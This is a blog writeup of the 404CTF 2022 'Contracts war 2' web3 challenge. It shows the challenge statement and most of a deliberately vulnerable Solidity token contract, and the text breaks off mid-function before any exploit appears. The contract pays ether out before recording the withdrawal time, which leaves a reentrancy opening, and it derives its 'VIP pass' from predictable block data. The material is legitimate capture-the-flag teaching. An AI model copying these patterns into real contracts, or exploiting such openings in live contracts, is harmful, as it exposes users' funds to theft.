<!doctype html><html lang=en-us><head><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><meta name=robots content="noodp"><title>Writeup 404CTF 2022 - Contracts war 2 (web3) - MevSec</title><meta name=Description content="Writeup of web3 challenge of 404CTF 2022 - contracts war 2/2"><meta property="og:title" content="Writeup 404CTF 2022 - Contracts war 2 (web3)"><meta property="og:description" content="Writeup of web3 challenge of 404CTF 2022 - contracts war 2/2"><meta property="og:type" content="article"><meta property="og:url" content="/posts/writeup-404ctf-22/contractswar2/"><meta property="og:image" content="/posts/writeup-404ctf-22/contractswar2/war2.png"><meta property="article:section" content="posts"><meta property="article:published_time" content="2023-01-26T00:00:00+00:00"><meta property="article:modified_time" content="2023-01-26T00:00:00+00:00"><meta property="og:site_name" content="MevSec Blog"><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content="/posts/writeup-404ctf-22/contractswar2/war2.png"><meta name=twitter:title content="Writeup 404CTF 2022 - Contracts war 2 (web3)"><meta name=twitter:description content="Writeup of web3 challenge of 404CTF 2022 - contracts war 2/2"><meta name=application-name content="MevSec's blog"><meta name=apple-mobile-web-app-title content="MevSec's blog"><meta name=theme-color content="#ffffff"><meta name=msapplication-TileColor content="#da532c"><link rel="shortcut icon" type=image/x-icon href=/favicon.ico><link rel=icon type=image/png sizes=32x32 href=/favicon-32x32.png><link rel=icon type=image/png sizes=16x16 href=/favicon-16x16.png><link rel=apple-touch-icon sizes=180x180 href=/apple-touch-icon.png><link rel=mask-icon href=/safari-pinned-tab.svg color=#5bbad5><link rel=manifest href=/site.webmanifest><link rel=canonical href=/posts/writeup-404ctf-22/contractswar2/><link rel=prev href=/posts/writeup-404ctf-22/publickey/><link rel=next href=/posts/writeup-404ctf-22/contractswar1/><link rel=stylesheet href=/css/style.min.css><link rel=preload href=/lib/fontawesome-free/all.min.css as=style onload='this.onload=null,this.rel="stylesheet"'><noscript><link rel=stylesheet href=/lib/fontawesome-free/all.min.css></noscript><link rel=preload href=/lib/animate/animate.min.css as=style onload='this.onload=null,this.rel="stylesheet"'><noscript><link rel=stylesheet href=/lib/animate/animate.min.css></noscript><script type=application/ld+json>{"@context":"http://schema.org","@type":"BlogPosting","headline":"Writeup 404CTF 2022 - Contracts war 2 (web3)","inLanguage":"en-us","mainEntityOfPage":{"@type":"WebPage","@id":"\/posts\/writeup-404ctf-22\/contractswar2\/"},"image":[{"@type":"ImageObject","url":"\/posts\/writeup-404ctf-22\/contractswar2\/war2.png","width":1703,"height":512}],"genre":"posts","keywords":"foundry, solidity, golang, web3, CTF, 404CTF","wordcount":3296,"url":"\/posts\/writeup-404ctf-22\/contractswar2\/","datePublished":"2023-01-26T00:00:00+00:00","dateModified":"2023-01-26T00:00:00+00:00","publisher":{"@type":"Organization","name":"Nodauf"},"author":{"@type":"Person","name":"Nodauf"},"description":"Writeup of web3 challenge of 404CTF 2022 - contracts war 2/2"}</script></head><body data-header-desktop=fixed data-header-mobile=auto><script type=text/javascript>(window.localStorage&&localStorage.getItem("theme")?localStorage.getItem("theme")==="dark":""==="auto"?window.matchMedia("(prefers-color-scheme: dark)").matches:""==="dark")&&document.body.setAttribute("theme","dark")</script><div id=mask></div><div class=wrapper><header class=desktop id=header-desktop><div class=header-wrapper><div class=header-title><a href=/ title=MevSec>MevSec</a></div><div class=menu><div class=menu-inner><a class=menu-item href=/posts/>Posts </a><a class=menu-item href=/categories/>Categories </a><span class="menu-item delimiter"></span><span class="menu-item search" id=search-desktop>
<input type=text placeholder="Search titles or contents..." id=search-input-desktop>
<a href=javascript:void(0); class="search-button search-toggle" id=search-toggle-desktop title=Search><i class="fas fa-search fa-fw" aria-hidden=true></i></a>
<a href=javascript:void(0); class="search-button search-clear" id=search-clear-desktop title=Clear><i class="fas fa-times-circle fa-fw" aria-hidden=true></i></a>
<span class="search-button search-loading" id=search-loading-desktop><i class="fas fa-spinner fa-fw fa-spin" aria-hidden=true></i></span>
</span><a href=javascript:void(0); class="menu-item theme-switch" title="Switch Theme"><i class="fas fa-adjust fa-fw" aria-hidden=true></i></a></div></div></div></header><header class=mobile id=header-mobile><div class=header-container><div class=header-wrapper><div class=header-title><a href=/ title=MevSec>MevSec</a></div><div class=menu-toggle id=menu-toggle-mobile><span></span><span></span><span></span></div></div><div class=menu id=menu-mobile><div class=search-wrapper><div class="search mobile" id=search-mobile><input type=text placeholder="Search titles or contents..." id=search-input-mobile>
<a href=javascript:void(0); class="search-button search-toggle" id=search-toggle-mobile title=Search><i class="fas fa-search fa-fw" aria-hidden=true></i></a>
<a href=javascript:void(0); class="search-button search-clear" id=search-clear-mobile title=Clear><i class="fas fa-times-circle fa-fw" aria-hidden=true></i></a>
<span class="search-button search-loading" id=search-loading-mobile><i class="fas fa-spinner fa-fw fa-spin" aria-hidden=true></i></span></div><a href=javascript:void(0); class=search-cancel id=search-cancel-mobile>Cancel</a></div><a class=menu-item href=/posts/ title>Posts</a><a class=menu-item href=/categories/ title>Categories</a><a href=javascript:void(0); class="menu-item theme-switch" title="Switch Theme">
<i class="fas fa-adjust fa-fw" aria-hidden=true></i></a></div></div></header><div class="search-dropdown desktop"><div id=search-dropdown-desktop></div></div><div class="search-dropdown mobile"><div id=search-dropdown-mobile></div></div><main class=main><div class=container><div class=toc id=toc-auto><h2 class=toc-title>Contents</h2><div class="toc-content always-active" id=toc-content-auto></div></div><article class="page single"><h1 class="single-title animate__animated animate__flipInX">Writeup 404CTF 2022 - Contracts war 2 (web3)</h1><div class=post-meta><div class=post-meta-line><span class=post-author><a href=https://twitter.com/EthnicalInfo title=Author target=_blank rel="noopener noreffer author" class=author><i class="fas fa-user-circle fa-fw" aria-hidden=true></i>Nodauf</a></span>&nbsp;<span class=post-category>included in <a href=/categories/web3/><i class="far fa-folder fa-fw" aria-hidden=true></i>Web3</a></span></div><div class=post-meta-line><i class="far fa-calendar-alt fa-fw" aria-hidden=true></i>&nbsp;<time datetime=2023-01-26>2023-01-26</time>&nbsp;<i class="fas fa-pencil-alt fa-fw" aria-hidden=true></i>&nbsp;3296 words&nbsp;
<i class="far fa-clock fa-fw" aria-hidden=true></i>&nbsp;16 minutes&nbsp;</div></div><div class="details toc" id=toc-static data-kept><div class="details-summary toc-title"><span>Contents</span>
<span><i class="details-icon fas fa-angle-right" aria-hidden=true></i></span></div><div class="details-content toc-content" id=toc-content-static><nav id=TableOfContents><ul><li><a href=#statement>Statement</a></li><li><a href=#exploitation>Exploitation</a><ul><li><a href=#vippass>VipPass</a></li><li><a href=#pwning-the-contract>Pwning the contract</a></li></ul></li></ul></nav></div></div><div class=content id=content><h2 id=statement>Statement</h2><p>The challenge statement is as follows:</p><blockquote><p>Agent, now that you have a little more web3 expertise, we would like to call upon your skills in a more delicate situation. We have detected traces of suspicious activity at the address 0xD5c0873f147cECF336fEEF1a28474716C745Df86. Hallebarde is apparently trying to create its own cryptocurrency. Also, it seems that the oldest members of Hedgehog can get some kind of VIP pass. Use this pass to get information only known by the elite of Halberd.</p><p>Contract at: 0xD5c0873f147cECF336fEEF1a28474716C745Df86</p><p>Ropsten test network</p><p>Author: Soremo</p><p>nc challenge.404ctf.fr 30885</p></blockquote><p>The source code of the smart contract is given:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>  1
</span><span class=lnt>  2
</span><span class=lnt>  3
</span><span class=lnt>  4
</span><span class=lnt>  5
</span><span class=lnt>  6
</span><span class=lnt>  7
</span><span class=lnt>  8
</span><span class=lnt>  9
</span><span class=lnt> 10
</span><span class=lnt> 11
</span><span class=lnt> 12
</span><span class=lnt> 13
</span><span class=lnt> 14
</span><span class=lnt> 15
</span><span class=lnt> 16
</span><span class=lnt> 17
</span><span class=lnt> 18
</span><span class=lnt> 19
</span><span class=lnt> 20
</span><span class=lnt> 21
</span><span class=lnt> 22
</span><span class=lnt> 23
</span><span class=lnt> 24
</span><span class=lnt> 25
</span><span class=lnt> 26
</span><span class=lnt> 27
</span><span class=lnt> 28
</span><span class=lnt> 29
</span><span class=lnt> 30
</span><span class=lnt> 31
</span><span class=lnt> 32
</span><span class=lnt> 33
</span><span class=lnt> 34
</span><span class=lnt> 35
</span><span class=lnt> 36
</span><span class=lnt> 37
</span><span class=lnt> 38
</span><span class=lnt> 39
</span><span class=lnt> 40
</span><span class=lnt> 41
</span><span class=lnt> 42
</span><span class=lnt> 43
</span><span class=lnt> 44
</span><span class=lnt> 45
</span><span class=lnt> 46
</span><span class=lnt> 47
</span><span class=lnt> 48
</span><span class=lnt> 49
</span><span class=lnt> 50
</span><span class=lnt> 51
</span><span class=lnt> 52
</span><span class=lnt> 53
</span><span class=lnt> 54
</span><span class=lnt> 55
</span><span class=lnt> 56
</span><span class=lnt> 57
</span><span class=lnt> 58
</span><span class=lnt> 59
</span><span class=lnt> 60
</span><span class=lnt> 61
</span><span class=lnt> 62
</span><span class=lnt> 63
</span><span class=lnt> 64
</span><span class=lnt> 65
</span><span class=lnt> 66
</span><span class=lnt> 67
</span><span class=lnt> 68
</span><span class=lnt> 69
</span><span class=lnt> 70
</span><span class=lnt> 71
</span><span class=lnt> 72
</span><span class=lnt> 73
</span><span class=lnt> 74
</span><span class=lnt> 75
</span><span class=lnt> 76
</span><span class=lnt> 77
</span><span class=lnt> 78
</span><span class=lnt> 79
</span><span class=lnt> 80
</span><span class=lnt> 81
</span><span class=lnt> 82
</span><span class=lnt> 83
</span><span class=lnt> 84
</span><span class=lnt> 85
</span><span class=lnt> 86
</span><span class=lnt> 87
</span><span class=lnt> 88
</span><span class=lnt> 89
</span><span class=lnt> 90
</span><span class=lnt> 91
</span><span class=lnt> 92
</span><span class=lnt> 93
</span><span class=lnt> 94
</span><span class=lnt> 95
</span><span class=lnt> 96
</span><span class=lnt> 97
</span><span class=lnt> 98
</span><span class=lnt> 99
</span><span class=lnt>100
</span><span class=lnt>101
</span><span class=lnt>102
</span><span class=lnt>103
</span><span class=lnt>104
</span><span class=lnt>105
</span><span class=lnt>106
</span><span class=lnt>107
</span><span class=lnt>108
</span><span class=lnt>109
</span><span class=lnt>110
</span><span class=lnt>111
</span><span class=lnt>112
</span><span class=lnt>113
</span><span class=lnt>114
</span><span class=lnt>115
</span><span class=lnt>116
</span><span class=lnt>117
</span><span class=lnt>118
</span><span class=lnt>119
</span><span class=lnt>120
</span><span class=lnt>121
</span><span class=lnt>122
</span><span class=lnt>123
</span><span class=lnt>124
</span><span class=lnt>125
</span><span class=lnt>126
</span><span class=lnt>127
</span><span class=lnt>128
</span><span class=lnt>129
</span><span class=lnt>130
</span><span class=lnt>131
</span><span class=lnt>132
</span><span class=lnt>133
</span><span class=lnt>134
</span><span class=lnt>135
</span><span class=lnt>136
</span><span class=lnt>137
</span><span class=lnt>138
</span><span class=lnt>139
</span><span class=lnt>140
</span><span class=lnt>141
</span><span class=lnt>142
</span><span class=lnt>143
</span><span class=lnt>144
</span><span class=lnt>145
</span><span class=lnt>146
</span><span class=lnt>147
</span><span class=lnt>148
</span><span class=lnt>149
</span><span class=lnt>150
</span><span class=lnt>151
</span><span class=lnt>152
</span><span class=lnt>153
</span><span class=lnt>154
</span><span class=lnt>155
</span><span class=lnt>156
</span><span class=lnt>157
</span><span class=lnt>158
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-solidity data-lang=solidity><span class=line><span class=cl><span class=k>pragma solidity</span> <span class=mi>0</span><span class=p>.</span><span class=mi>8</span><span class=p>.</span><span class=mi>13</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=c1>// solidity &gt; 0.8.0 is using SafeMath by default. No integer underflow or overflow.
</span></span></span><span class=line><span class=cl><span class=c1></span>
</span></span><span class=line><span class=cl><span class=kd>interface</span> <span class=nc>IERC20</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=kd>function</span> <span class=nf>totalSupply</span><span class=p>()</span> <span class=k>external</span> <span class=k>view</span> <span class=k>returns</span> <span class=p>(</span><span class=kt>uint256</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=kd>function</span> <span class=nf>balanceOf</span><span class=p>(</span><span class=kt>address</span> <span class=n>account</span><span class=p>)</span> <span class=k>external</span> <span class=k>view</span> <span class=k>returns</span> <span class=p>(</span><span class=kt>uint256</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=kd>function</span> <span class=nf>allowance</span><span class=p>(</span><span class=kt>address</span> <span class=n>owner</span><span class=p>,</span> <span class=kt>address</span> <span class=n>spender</span><span class=p>)</span> <span class=k>external</span> <span class=k>view</span> <span class=k>returns</span> <span class=p>(</span><span class=kt>uint256</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=kd>function</span> <span class=nf>transfer</span><span class=p>(</span><span class=kt>address</span> <span class=n>recipient</span><span class=p>,</span> <span class=kt>uint256</span> <span class=n>amount</span><span class=p>)</span> <span class=k>external</span> <span class=k>returns</span> <span class=p>(</span><span class=kt>bool</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=kd>function</span> <span class=nf>approve</span><span class=p>(</span><span class=kt>address</span> <span class=n>spender</span><span class=p>,</span> <span class=kt>uint256</span> <span class=n>amount</span><span class=p>)</span> <span class=k>external</span> <span class=k>returns</span> <span class=p>(</span><span class=kt>bool</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=kd>function</span> <span class=nf>transferFrom</span><span class=p>(</span><span class=kt>address</span> <span class=nb>sender</span><span class=p>,</span> <span class=kt>address</span> <span class=n>recipient</span><span class=p>,</span> <span class=kt>uint256</span> <span class=n>amount</span><span class=p>)</span> <span class=k>external</span> <span class=k>returns</span> <span class=p>(</span><span class=kt>bool</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=kd>event</span> <span class=nc>Transfer</span><span class=p>(</span><span class=kt>address</span> <span class=k>indexed</span> <span class=k>from</span><span class=p>,</span> <span class=kt>address</span> <span class=k>indexed</span> <span class=n>to</span><span class=p>,</span> <span class=kt>uint256</span> <span class=nb>value</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=kd>event</span> <span class=nc>Approval</span><span class=p>(</span><span class=kt>address</span> <span class=k>indexed</span> <span class=n>owner</span><span class=p>,</span> <span class=kt>address</span> <span class=k>indexed</span> <span class=n>spender</span><span class=p>,</span> <span class=kt>uint256</span> <span class=nb>value</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kd>contract</span> <span class=nc>HallebardeToken</span> <span class=k>is</span> <span class=n>IERC20</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=kn>using</span> <span class=n>SafeMath</span> <span class=k>for</span> <span class=kt>uint256</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=kt>string</span> <span class=k>public</span> <span class=k>constant</span> <span class=nb>name</span> <span class=o>=</span> <span class=s>&#34;Hallebarde&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=kt>string</span> <span class=k>public</span> <span class=k>constant</span> <span class=n>symbol</span> <span class=o>=</span> <span class=s>&#34;HLB&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=kt>uint8</span> <span class=k>public</span> <span class=k>constant</span> <span class=n>decimals</span> <span class=o>=</span> <span class=mi>18</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=kd>mapping</span><span class=p>(</span><span class=kt>address</span> <span class=o>=&gt;</span> <span class=kt>uint256</span><span class=p>)</span> <span class=n>balances</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=kd>mapping</span><span class=p>(</span><span class=kt>address</span> <span class=o>=&gt;</span> <span class=kd>mapping</span> <span class=p>(</span><span class=kt>address</span> <span class=o>=&gt;</span> <span class=kt>uint256</span><span class=p>))</span> <span class=n>allowed</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=kd>mapping</span><span class=p>(</span><span class=kt>address</span> <span class=o>=&gt;</span> <span class=kt>uint256</span><span class=p>)</span> <span class=n>seniority</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=kd>mapping</span><span class=p>(</span><span class=kt>address</span> <span class=o>=&gt;</span> <span class=kt>uint256</span><span class=p>)</span> <span class=n>lastWithdrawTime</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=kt>uint256</span> <span class=k>private</span> <span class=n>vipPass</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=kt>address</span> <span class=k>private</span> <span class=n>boss</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=kt>uint256</span> <span class=n>totalSupply_</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=kd>constructor</span><span class=p>(</span><span class=kt>string</span> <span class=k>memory</span> <span class=n>_password</span><span class=p>)</span> <span class=k>public</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>   <span class=n>totalSupply_</span> <span class=o>=</span> <span class=mi>1000000</span> <span class=kc>ether</span><span class=p>;</span>
</span></span><span class=line><span class=cl>   <span class=n>balances</span><span class=p>[</span><span class=nb>msg</span><span class=p>.</span><span class=nb>sender</span><span class=p>]</span> <span class=o>=</span> <span class=mi>1000</span> <span class=kc>ether</span><span class=p>;</span>
</span></span><span class=line><span class=cl>   <span class=n>balances</span><span class=p>[</span><span class=kt>address</span><span class=p>(</span><span class=nb>this</span><span class=p>)]</span> <span class=o>=</span> <span class=mi>999000</span> <span class=kc>ether</span><span class=p>;</span>
</span></span><span class=line><span class=cl>   <span class=n>seniority</span><span class=p>[</span><span class=nb>msg</span><span class=p>.</span><span class=nb>sender</span><span class=p>]</span> <span class=o>=</span> <span class=mi>10</span><span class=o>*</span><span class=mi>365</span> <span class=kc>days</span><span class=p>;</span>
</span></span><span class=line><span class=cl>   <span class=n>boss</span> <span class=o>=</span> <span class=nb>msg</span><span class=p>.</span><span class=nb>sender</span><span class=p>;</span>
</span></span><span class=line><span class=cl>   <span class=n>rand</span><span class=p>(</span><span class=n>_password</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=kd>function</span> <span class=nf>rand</span><span class=p>(</span><span class=kt>string</span> <span class=k>memory</span> <span class=n>_password</span><span class=p>)</span> <span class=k>public</span> <span class=n>onlyOwner</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>   <span class=n>vipPass</span> <span class=o>=</span> <span class=kt>uint</span><span class=p>(</span><span class=nb>keccak256</span><span class=p>(</span><span class=nb>abi</span><span class=p>.</span><span class=nb>encodePacked</span><span class=p>(</span>
</span></span><span class=line><span class=cl>   <span class=nb>msg</span><span class=p>.</span><span class=nb>sender</span><span class=p>,</span>
</span></span><span class=line><span class=cl>   <span class=nb>block</span><span class=p>.</span><span class=nb>timestamp</span><span class=p>,</span>
</span></span><span class=line><span class=cl>   <span class=nb>block</span><span class=p>.</span><span class=nb>difficulty</span><span class=p>,</span>
</span></span><span class=line><span class=cl>   <span class=n>vipPass</span><span class=p>,</span>
</span></span><span class=line><span class=cl>   <span class=n>balances</span><span class=p>[</span><span class=kt>address</span><span class=p>(</span><span class=nb>this</span><span class=p>)],</span>
</span></span><span class=line><span class=cl>   <span class=n>_password</span><span class=p>)));</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=kd>function</span> <span class=nf>totalSupply</span><span class=p>()</span> <span class=k>public</span> <span class=k>override</span> <span class=k>view</span> <span class=k>returns</span> <span class=p>(</span><span class=kt>uint256</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>   <span class=k>return</span> <span class=n>totalSupply_</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=kd>function</span> <span class=nf>balanceOf</span><span class=p>(</span><span class=kt>address</span> <span class=n>tokenOwner</span><span class=p>)</span> <span class=k>public</span> <span class=k>override</span> <span class=k>view</span> <span class=k>returns</span> <span class=p>(</span><span class=kt>uint256</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>   <span class=k>return</span> <span class=n>balances</span><span class=p>[</span><span class=n>tokenOwner</span><span class=p>];</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=kd>function</span> <span class=nf>seniorityOf</span><span class=p>(</span><span class=kt>address</span> <span class=n>tokenOwner</span><span class=p>)</span> <span class=k>public</span> <span class=k>view</span> <span class=k>returns</span> <span class=p>(</span><span class=kt>uint256</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>   <span class=k>return</span> <span class=n>seniority</span><span class=p>[</span><span class=n>tokenOwner</span><span class=p>];</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=c1>// buyHLB to get HLB token.
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=kd>function</span> <span class=nf>buyHLB</span><span class=p>()</span> <span class=k>public</span> <span class=k>payable</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>   <span class=nb>require</span><span class=p>(</span><span class=nb>msg</span><span class=p>.</span><span class=nb>value</span> <span class=o>&gt;</span> <span class=mi>0</span><span class=p>,</span> <span class=s>&#34;Vous avez besoin d&#39;ethereum pour acheter des HLB.&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>   <span class=nb>require</span><span class=p>(</span><span class=n>balances</span><span class=p>[</span><span class=kt>address</span><span class=p>(</span><span class=nb>this</span><span class=p>)]</span> <span class=o>&gt;=</span> <span class=nb>msg</span><span class=p>.</span><span class=nb>value</span><span class=p>,</span> <span class=s>&#34;Il n&#39;y a plus assez de HLB disponible. Revenez plus tard.&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>   <span class=n>balances</span><span class=p>[</span><span class=nb>msg</span><span class=p>.</span><span class=nb>sender</span><span class=p>]</span> <span class=o>=</span> <span class=n>balances</span><span class=p>[</span><span class=nb>msg</span><span class=p>.</span><span class=nb>sender</span><span class=p>].</span><span class=n>add</span><span class=p>(</span><span class=nb>msg</span><span class=p>.</span><span class=nb>value</span><span class=p>);</span>
</span></span><span class=line><span class=cl>   <span class=n>balances</span><span class=p>[</span><span class=kt>address</span><span class=p>(</span><span class=nb>this</span><span class=p>)]</span> <span class=o>=</span> <span class=n>balances</span><span class=p>[</span><span class=kt>address</span><span class=p>(</span><span class=nb>this</span><span class=p>)].</span><span class=n>sub</span><span class=p>(</span><span class=nb>msg</span><span class=p>.</span><span class=nb>value</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=c1>// sellHLB to sell HLB token. We can sell token once per year.
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=kd>function</span> <span class=nf>sellHLB</span><span class=p>(</span><span class=kt>uint256</span> <span class=n>numTokens</span><span class=p>)</span> <span class=k>public</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>   <span class=c1>// Check if we have enough token to sell
</span></span></span><span class=line><span class=cl><span class=c1></span>   <span class=nb>require</span><span class=p>(</span><span class=n>balances</span><span class=p>[</span><span class=nb>msg</span><span class=p>.</span><span class=nb>sender</span><span class=p>]</span> <span class=o>&gt;=</span> <span class=n>numTokens</span><span class=p>);</span>
</span></span><span class=line><span class=cl>   <span class=c1>// Check the last time we sold HLB
</span></span></span><span class=line><span class=cl><span class=c1></span>   <span class=nb>require</span><span class=p>(</span><span class=nb>block</span><span class=p>.</span><span class=nb>timestamp</span> <span class=o>&gt;=</span> <span class=n>lastWithdrawTime</span><span class=p>[</span><span class=nb>msg</span><span class=p>.</span><span class=nb>sender</span><span class=p>]</span> <span class=o>+</span> <span class=mi>365</span> <span class=kc>days</span><span class=p>,</span> <span class=s>&#34;Vous devez attendre un an entre chaque retrait.&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>   <span class=c1>// Call the function transfer below to update the balance of the receiver and the sender.
</span></span></span><span class=line><span class=cl><span class=c1></span>   <span class=nb>transfer</span><span class=p>(</span><span class=kt>address</span><span class=p>(</span><span class=nb>this</span><span class=p>),</span> <span class=n>numTokens</span><span class=p>);</span>
</span></span><span class=line><span class=cl>   <span class=c1>// Update the seniroty of the user. The seniority is used to get the vip pass.
</span></span></span><span class=line><span class=cl><span class=c1></span>   <span class=n>seniority</span><span class=p>[</span><span class=nb>msg</span><span class=p>.</span><span class=nb>sender</span><span class=p>]</span> <span class=o>=</span> <span class=n>seniority</span><span class=p>[</span><span class=nb>msg</span><span class=p>.</span><span class=nb>sender</span><span class=p>].</span><span class=n>add</span><span class=p>(</span><span class=mi>365</span> <span class=kc>days</span><span class=p>);</span>
</span></span><span class=line><span class=cl>   <span class=c1>// Send ether to the remote address. The fallback function is used to send ether to the contract.
</span></span></span><span class=line><span class=cl><span class=c1></span>   <span class=p>(</span><span class=kt>bool</span> <span class=n>sent</span><span class=p>,</span> <span class=p>)</span> <span class=o>=</span> <span class=nb>msg</span><span class=p>.</span><span class=nb>sender</span><span class=p>.</span><span class=nb>call</span><span class=p>{</span><span class=nb>value</span><span class=o>:</span> <span class=n>numTokens</span><span class=p>}(</span><span class=s>&#34;&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>   <span class=nb>require</span><span class=p>(</span><span class=n>sent</span><span class=p>,</span> <span class=s>&#34;Erreur lors de l&#39;envoi de l&#39;ethereum.&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>   <span class=c1>// Update the last time we sold HLB. This is used to check if we can sell HLB again.
</span></span></span><span class=line><span class=cl><span class=c1></span>   <span class=n>lastWithdrawTime</span><span class=p>[</span><span class=nb>msg</span><span class=p>.</span><span class=nb>sender</span><span class=p>]</span> <span class=o>=</span> <span class=nb>block</span><span class=p>.</span><span class=nb>timestamp</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=kd>function</span> <span class=nf>transfer</span><span class=p>(</span><span class=kt>address</span> <span class=n>receiver</span><span class=p>,</span> <span class=kt>uint256</span> <span class=n>numTokens</span><span class=p>)</span> <span class=k>public</span> <span class=k>override</span> <span class=k>returns</span> <span class=p>(</span><span class=kt>bool</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>   <span class=nb>require</span><span class=p>(</span><span class=n>numTokens</span> <span class=o>&lt;=</span> <span class=n>balances</span><span class=p>[</span><span class=nb>msg</span><span class=p>.</span><span class=nb>sender</span><span class=p>]);</span>
</span></span><span class=line><span class=cl>   <span class=n>balances</span><span class=p>[</span><span class=nb>msg</span><span class=p>.</span><span class=nb>sender</span><span class=p>]</span> <span class=o>=</span> <span class=n>balances</span><span class=p>[</span><span class=nb>msg</span><span class=p>.</span><span class=nb>sender</span><span class=p>].</span><span class=n>sub</span><span class=p>(</span><span class=n>numTokens</span><span class=p>);</span>
</span></span><span class=line><span class=cl>   <span class=n>balances</span><span class=p>[</span><span class=n>receiver</span><span class=p>]</span> <span class=o>=</span> <span class=n>balances</span><span class=p>[</span><span class=n>receiver</span><span class=p>].</span><span class=n>add</span><span class=p>(</span><span class=n>numTokens</span><span class=p>);</span>
</span></span><span class=line><span class=cl>   <span class=n>emit</span> <span class=n>Transfer</span><span class=p>(</span><span class=nb>msg</span><span class=p>.</span><span class=nb>sender</span><span class=p>,</span> <span class=n>receiver</span><span class=p>,</span> <span class=n>numTokens</span><span class=p>);</span>
</span></span><span class=line><span class=cl>   <span class=k>return</span> <span class=kc>true</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=kd>function</span> <span class=nf>approve</span><span class=p>(</span><span class=kt>address</span> <span class=n>delegate</span><span class=p>,</span> <span class=kt>uint256</span> <span class=n>numTokens</span><span class=p>)</span> <span class=k>public</span> <span class=k>override</span> <span class=k>returns</span> <span class=p>(</span><span class=kt>bool</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>   <span class=n>allowed</span><span class=p>[</span><span class=nb>msg</span><span class=p>.</span><span class=nb>sender</span><span class=p>][</span><span class=n>delegate</span><span class=p>]</span> <span class=o>=</span> <span class=n>numTokens</span><span class=p>;</span>
</span></span><span class=line><span class=cl>   <span class=n>emit</span> <span class=n>Approval</span><span class=p>(</span><span class=nb>msg</span><span class=p>.</span><span class=nb>sender</span><span class=p>,</span> <span class=n>delegate</span><span class=p>,</span> <span class=n>numTokens</span><span class=p>);</span>
</span></span><span class=line><span class=cl>   <span class=k>return</span> <span class=kc>true</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=kd>function</span> <span class=nf>reset</span><span class=p>()</span> <span class=k>external</span> <span class=k>returns</span> <span class=p>(</span><span class=kt>string</span> <span class=k>memory</span><span class=p>){</span>
</span></span><span class=line><span class=cl>   <span class=n>balances</span><span class=p>[</span><span class=nb>msg</span><span class=p>.</span><span class=nb>sender</span><span class=p>]</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span>
